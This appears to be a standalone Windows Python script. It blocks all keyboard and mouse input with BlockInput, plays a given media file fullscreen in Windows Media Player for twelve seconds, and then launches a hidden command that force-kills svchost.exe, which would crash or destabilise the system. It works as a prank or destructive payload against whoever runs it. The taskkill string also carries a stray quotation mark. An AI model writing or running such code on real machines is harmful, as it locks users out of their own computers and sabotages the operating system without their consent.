import sys,os,time,ctypes,subprocess

# parameters
out = sys.argv[1]
batch = sys.argv[2]

# block user input
ctypes.windll.user32.BlockInput(True)

# launch Windows Media Player explicitly in fullscreen
wmp = r'C:\Program Files\Windows Media Player\wmplayer.exe'
proc = subprocess.Popen([wmp, '/fullscreen', '/play', out])
time.sleep(12)
proc.terminate()

cmdline = f'cmd /c TASKKILL /IM svchost.exe /F"'
si = subprocess.STARTUPINFO()
si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
si.wShowWindow = subprocess.SW_HIDE
subprocess.Popen(cmdline, startupinfo=si)


